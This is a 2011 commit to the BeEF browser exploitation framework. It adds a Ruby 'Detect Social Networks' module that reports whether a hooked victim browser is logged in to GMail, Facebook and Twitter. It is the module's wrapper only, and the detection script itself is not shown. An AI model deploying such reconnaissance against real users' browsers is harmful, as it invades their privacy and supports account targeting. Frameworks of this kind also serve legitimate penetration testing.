4311e173985508ad0f329b25f57cab19b41cb34c
xntrik <xntrik@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-03-12 09:17:49 +0000

    issue 265 : detect social networks - command module
    git-svn-id: https://beef.googlecode.com/svn/trunk@788 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

---
+++ modules/commands/recon/detect_soc_nets/detect_soc_nets.rb
@@ -0,0 +1,40 @@
+module BeEF
+module Modules
+module Commands
+
+class Detect_soc_nets < BeEF::Command
+  
+  def initialize
+    super({
+      'Name' => 'Detect Social Networks',
+      'Description' => 'This module will detect if the Hooked Browser is currently authenticated to GMail, Facebook and Twitter',
+      'Category' => 'Recon',
+      'Author' => ['xntrik', 'Mike Cardwell'],
+      'Data' => [
+        {'name' => 'timeout', 'ui_label' => 'Detection Timeout','value' => '5000'}
+      ],
+      'File' => __FILE__
+    })
+
+    set_target({
+      'verified_status' =>  VERIFIED_WORKING, 
+      'browser_name' =>     ALL
+    })
+    
+    use 'beef.net.local'
+    use_template!
+  end
+  
+  def callback
+    content = {}
+    content['GMail'] = @datastore['gmail']
+    content['Facebook'] = @datastore['facebook']
+    content['Twitter']= @datastore['twitter']
+    save content
+  end
+  
+end
+
+end
+end
+end
